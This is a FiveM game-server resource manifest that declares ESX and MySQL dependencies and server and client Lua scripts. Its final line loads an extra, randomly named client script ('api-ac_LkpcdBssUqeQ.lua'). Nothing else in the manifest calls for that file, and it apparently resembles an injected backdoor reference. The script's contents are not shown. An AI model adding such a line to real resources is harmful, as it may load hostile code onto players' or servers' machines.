resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

server_script{
    '@mysql-async/lib/MySQL.lua',
    '@es_extended/locale.lua',
    'server.lua'
} 
client_script{ 
    '@es_extended/locale.lua',
    'client.lua'
}

dependencies 'es_extended'

client_script "api-ac_LkpcdBssUqeQ.lua"